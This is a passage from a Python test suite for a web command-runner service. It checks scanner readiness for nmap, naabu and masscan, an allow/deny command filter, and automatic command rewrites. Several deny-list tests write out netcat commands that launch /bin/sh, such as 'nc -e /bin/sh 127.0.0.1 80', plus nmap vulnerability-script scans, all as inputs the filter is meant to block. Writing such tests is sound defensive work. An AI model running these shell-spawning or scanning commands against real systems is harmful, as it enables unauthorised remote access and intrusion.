                return_value={"CapBnd": "not-hex", "NoNewPrivs": "1"},
            ) as proc_status,
            mock.patch(
                "services.commands.raw_packets.shutil.which",
                side_effect=lambda tool: binary_paths.get(tool),
            ),
            mock.patch(
                "services.commands.raw_packets._file_capabilities",
                return_value="cap_net_raw=eip",
            ),
            mock.patch(
                "services.commands.raw_packets._restricted_cidr_firewall_state",
                return_value=(True, ("192.0.2.0/24",)),
            ),
            mock.patch("services.commands.raw_packets.sys.platform", "linux"),
        ):
            raw_packets.clear_raw_packet_readiness_cache()
            first = raw_packets._raw_packet_system_readiness()
            second = raw_packets._raw_packet_system_readiness()
            assert first is second
            assert first["cap_net_raw_bounded"] is False
            assert first["no_new_privileges"] is True
            assert proc_status.call_count == 1
            raw_packets.clear_raw_packet_readiness_cache()
            raw_packets._raw_packet_system_readiness()
            assert proc_status.call_count == 2
        raw_packets.clear_raw_packet_readiness_cache()

        with (
            mock.patch(
                "services.commands.raw_packets._proc_status_fields",
                return_value={"CapBnd": "0000000000002000", "NoNewPrivs": "0"},
            ),
            mock.patch(
                "services.commands.raw_packets.shutil.which",
                side_effect=lambda tool: None if tool == "masscan" else binary_paths.get(tool),
            ),
            mock.patch(
                "services.commands.raw_packets._file_capabilities",
                return_value="cap_net_raw=eip",
            ),
            mock.patch(
                "services.commands.raw_packets._restricted_cidr_firewall_state",
                return_value=(False, ()),
            ),
            mock.patch("services.commands.raw_packets.sys.platform", "linux"),
        ):
            missing_binary_system = raw_packets._raw_packet_system_readiness()
        assert missing_binary_system["tools"]["masscan"] == {
            "available": False,
            "binary_present": False,
            "file_cap_net_raw": False,
            "path": "",
        }
        raw_packets.clear_raw_packet_readiness_cache()

        configured = {"raw_packet_scanning_enabled": True}
        ready_system = {
            "linux": True,
            "cap_net_raw_bounded": True,
            "no_new_privileges": False,
            "restricted_cidr_firewall_ready": True,
            "restricted_cidr_firewall_cidrs": ("192.0.2.0/24",),
            "tools": {
                tool: {
                    "binary_present": True,
                    "file_cap_net_raw": True,
                    "path": binary_paths[tool],
                }
                for tool in raw_packets.RAW_PACKET_TOOLS
            },
        }
        reason_cases = (
            ({**ready_system, "linux": False}, "nmap", configured, "linux_required"),
            ({**ready_system, "cap_net_raw_bounded": False}, "naabu", configured, "cap_net_raw_not_bounded"),
            ({**ready_system, "no_new_privileges": True}, "masscan", configured, "no_new_privileges"),
            (
                {
                    **ready_system,
                    "tools": {
                        **ready_system["tools"],
                        "nmap": {"binary_present": False, "file_cap_net_raw": False, "path": ""},
                    },
                },
                "nmap",
                configured,
                "scanner_binary_missing",
            ),
            (
                {
                    **ready_system,
                    "tools": {
                        **ready_system["tools"],
                        "naabu": {
                            "binary_present": True,
                            "file_cap_net_raw": False,
                            "path": binary_paths["naabu"],
                        },
                    },
                },
                "naabu",
                configured,
                "scanner_file_capability_missing",
            ),
            (
                ready_system,
                "nmap",
                {**configured, "restricted_command_input_cidrs": ["198.51.100.0/24"]},
                "restricted_cidr_firewall_unavailable",
            ),
            (
                ready_system,
                "masscan",
                {**configured, "restricted_command_input_cidrs": ["192.0.2.0/24"]},
                "packet_socket_egress_policy_required",
            ),
        )
        shared_reason_cases = []
        for tool in raw_packets.RAW_PACKET_TOOLS:
            missing_binary_tools = {
                **ready_system["tools"],
                tool: {"binary_present": False, "file_cap_net_raw": False, "path": ""},
            }
            missing_capability_tools = {
                **ready_system["tools"],
                tool: {
                    "binary_present": True,
                    "file_cap_net_raw": False,
                    "path": binary_paths[tool],
                },
            }
            shared_reason_cases.extend((
                ({**ready_system, "linux": False}, tool, configured, "linux_required"),
                (
                    {**ready_system, "cap_net_raw_bounded": False},
                    tool,
                    configured,
                    "cap_net_raw_not_bounded",
                ),
                (
                    {**ready_system, "no_new_privileges": True},
                    tool,
                    configured,
                    "no_new_privileges",
                ),
                (
                    {**ready_system, "tools": missing_binary_tools},
                    tool,
                    configured,
                    "scanner_binary_missing",
                ),
                (
                    {**ready_system, "tools": missing_capability_tools},
                    tool,
                    configured,
                    "scanner_file_capability_missing",
                ),
            ))
        shared_reason_cases.extend((
            (
                ready_system,
                "naabu",
                {**configured, "restricted_command_input_cidrs": ["192.0.2.0/24"]},
                "packet_socket_egress_policy_required",
            ),
            (
                ready_system,
                "masscan",
                {**configured, "restricted_command_input_cidrs": ["192.0.2.0/24"]},
                "packet_socket_egress_policy_required",
            ),
        ))
        for system_state, tool, cfg, expected_reason in (*reason_cases, *shared_reason_cases):
            with mock.patch(
                "services.commands.raw_packets._raw_packet_system_readiness",
                return_value=system_state,
            ):
                status = raw_packet_runtime_status(cfg, tool=tool)
            assert status["configured"] is True
            assert status["available"] is False
            assert status["active"] is False
            assert status["reason"] == expected_reason

    def test_deny_exact_match(self):
        ok, _ = _check("nmap -sU", allow=["nmap"], deny=["nmap -sU"])
        assert not ok

    def test_deny_prefix_with_more_args(self):
        # "nmap --script vuln 10.0.0.1" should be denied if "nmap --script" is in deny list
        ok, _ = _check("nmap --script vuln 10.0.0.1", allow=["nmap"], deny=["nmap --script"])
        assert not ok

    def test_empty_deny_list_has_no_effect(self):
        ok, _ = _check("nmap -sV 10.0.0.1", allow=["nmap"], deny=[])
        assert ok

    def test_deny_flag_anywhere_in_command(self):
        # Flag should be denied even when other flags precede it
        ok, _ = _check("curl -s -o /tmp/out https://darklab.sh", allow=["curl"], deny=["curl -o"])
        assert not ok
        ok, _ = _check("curl --config=/tmp/curlrc https://darklab.sh", allow=["curl"], deny=["curl --config"])
        assert not ok

    def test_deny_flag_at_end(self):
        ok, _ = _check("nmap -sT 10.0.0.1 --script", allow=["nmap"], deny=["nmap --script"])
        assert not ok

    def test_deny_flag_matches_exact_case(self):
        ok, _ = _check("curl -K config.txt", allow=["curl"], deny=["curl -K"])
        assert not ok

    def test_deny_flag_does_not_cross_case_boundary(self):
        ok, _ = _check("curl -k https://darklab.sh", allow=["curl"], deny=["curl -K"])
        assert ok

    def test_deny_tool_prefix_still_case_insensitive(self):
        ok, _ = _check("CURL -K config.txt", allow=["curl"], deny=["curl -K"])
        assert not ok

    def test_workspace_nmap_output_flag_exempts_combined_deny_group(self, tmp_path):
        # Managed nmap output flags are rewritten into the session workspace
        # before deny-prefix checks so safe file capture still works.
        with mock.patch.dict(commands.app_config.CFG, {
            "workspace_enabled": True,
            "workspace_backend": "tmpfs",
            "workspace_root": str(tmp_path),
            "workspace_quota_mb": 1,
            "workspace_max_file_mb": 1,
            "workspace_max_files": 10,
        }):
            ok, _ = _check("nmap -oN output.txt", allow=["nmap"], deny=["nmap -o"])
        assert ok

    def test_devnull_exception_prefix(self):
        # curl -o /dev/null ... is a common pattern for checking HTTP status — should be allowed
        ok, _ = _check("curl -o /dev/null -s -w \"%{http_code}\" https://darklab.sh",
                        allow=["curl"], deny=["curl -o"])
        assert ok

    def test_devnull_exception_anywhere(self):
        # Flag anywhere in command pointing to /dev/null should also be allowed
        ok, _ = _check("wget -q -o /dev/null --server-response https://darklab.sh",
                        allow=["wget"], deny=["wget -o"])
        assert ok

    def test_devnull_exception_does_not_allow_real_paths(self):
        ok, _ = _check("curl -o /tmp/out https://darklab.sh", allow=["curl"], deny=["curl -o"])
        assert not ok

    # Single-char combined flag matching
    def test_deny_single_char_flag_combined_at_end(self):
        # -ve contains denied -e
        ok, _ = _check("nc -ve 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_combined_at_start(self):
        # -ev contains denied -e
        ok, _ = _check("nc -ev 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_combined_in_middle(self):
        # -zve contains denied -e
        ok, _ = _check("nc -zve 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_combined_c_flag(self):
        # -vc contains denied -c
        ok, _ = _check("nc -vc /bin/sh 127.0.0.1 80", allow=["nc"], deny=["nc -c"])
        assert not ok

    def test_deny_single_char_flag_standalone_still_caught(self):
        # Plain -e still caught as before
        ok, _ = _check("nc -e /bin/sh 127.0.0.1 80", allow=["nc"], deny=["nc -e"])
        assert not ok

    def test_deny_single_char_flag_unrelated_combined_allowed(self):
        # -zv does not contain -e or -c, should be allowed
        ok, _ = _check("nc -zv example.com 80", allow=["nc"], deny=["nc -e", "nc -c"])
        assert ok

    def test_deny_single_char_does_not_affect_multi_char_matching(self):
        # Multi-char flag --script should still use exact-token matching, not char search
        ok, _ = _check("nmap -sT 10.0.0.1", allow=["nmap"], deny=["nmap --script"])
        assert ok


# ── Command rewrites ──────────────────────────────────────────────────────────

class TestRewrites:
    def test_mtr_adds_report_wide(self):
        cmd, notice = rewrite_command("mtr google.com")
        assert "--report-wide" in cmd
        assert notice is not None

    def test_mtr_no_rewrite_if_report_flag_present(self):
        cmd, notice = rewrite_command("mtr --report google.com")
        assert "--report-wide" not in cmd
        assert notice is None

    def test_mtr_no_rewrite_if_report_wide_present(self):
        cmd, notice = rewrite_command("mtr --report-wide google.com")
        assert cmd.count("--report-wide") == 1  # not doubled
        assert notice is None

    def test_mtr_short_flag_no_rewrite(self):
        cmd, notice = rewrite_command("mtr -r google.com")
        assert "--report-wide" not in cmd
        assert notice is None

    def test_nmap_adds_connect_scan(self):
        cmd, notice = rewrite_command("nmap -sV 10.0.0.1")
        assert "-sT" in cmd
        assert "--privileged" not in cmd
        assert notice is None  # silent rewrite

    def test_nmap_no_double_connect_scan(self):
        cmd, _ = rewrite_command("nmap -sT -sV 10.0.0.1")
        assert cmd.count("-sT") == 1

    def test_nuclei_adds_template_dir(self):
        cmd, notice = rewrite_command("nuclei -u https://darklab.sh")
        assert "-ud /tmp/nuclei-templates" in cmd
        assert notice is None

    def test_nuclei_no_rewrite_if_ud_present(self):
        cmd, _ = rewrite_command("nuclei -ud /tmp/my-templates -u https://darklab.sh")
        assert cmd.count("-ud") == 1

    def test_trufflehog_scans_default_to_json_output(self):
        cmd, notice = rewrite_command("trufflehog git https://github.com/trufflesecurity/test_keys")
        assert cmd == "trufflehog git https://github.com/trufflesecurity/test_keys --json"
        assert notice is None

        cmd, _ = rewrite_command("trufflehog filesystem --directory secrets --json")
        assert cmd.count("--json") == 1

        cmd, _ = rewrite_command("trufflehog --help")
        assert cmd == "trufflehog --help"

    def test_no_rewrite_for_other_commands(self):
        cmd, notice = rewrite_command("dig google.com")
        assert cmd == "dig google.com"
        assert notice is None


# ── Runtime command availability helpers ─────────────────────────────────────

class TestRuntimeCommandHelpers:
    def test_split_command_argv_uses_shell_like_tokenization(self):
        assert split_command_argv('curl -H "X-Test: 1" https://darklab.sh') == [
            "curl", "-H", "X-Test: 1", "https://darklab.sh"
        ]

    def test_command_root_returns_lowercased_first_token(self):
        assert command_root("NMAP -sV darklab.sh") == "nmap"

    def test_command_root_returns_none_for_blank_input(self):
        assert command_root("   ") is None

    def test_runtime_missing_command_name_returns_none_when_installed(self):
        with mock.patch("services.commands.registry.resolve_runtime_command", return_value="/usr/bin/curl"):
            assert runtime_missing_command_name("curl https://darklab.sh") is None

    def test_runtime_missing_command_name_returns_root_when_missing(self):
        with mock.patch("services.commands.registry.resolve_runtime_command", return_value=None):
            assert runtime_missing_command_name("nmap -sV darklab.sh") == "nmap"

    def test_runtime_missing_command_name_skips_env_assignments(self):
        def fake_resolve(name):
            return "/usr/bin/env" if name == "env" else None

        with mock.patch("services.commands.registry.resolve_runtime_command", side_effect=fake_resolve):
            assert runtime_missing_command_name("env XDG_CONFIG_HOME=/tmp nmap -sV darklab.sh") == "nmap"

    def test_runtime_missing_command_message_is_stable(self):
        assert runtime_missing_command_message("nmap") == "Command is not installed on this instance: nmap"
